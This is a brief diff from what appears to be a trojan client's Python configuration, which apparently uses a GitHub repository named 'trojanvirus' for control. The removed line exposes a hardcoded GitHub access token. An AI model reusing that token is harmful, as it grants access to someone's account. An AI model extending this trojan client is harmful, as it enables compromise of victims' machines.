@@ -17,7 +17,7 @@ from github import Github
 
 
 # Configuratie
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN") # Haal token uit environment variable voor veiligheid
 GITHUB_REPO = "Darkknin12/trojanvirus"
 TROJAN_ID = f"trojan_{random.randint(1000, 9999)}"  # Unieke ID per client
 
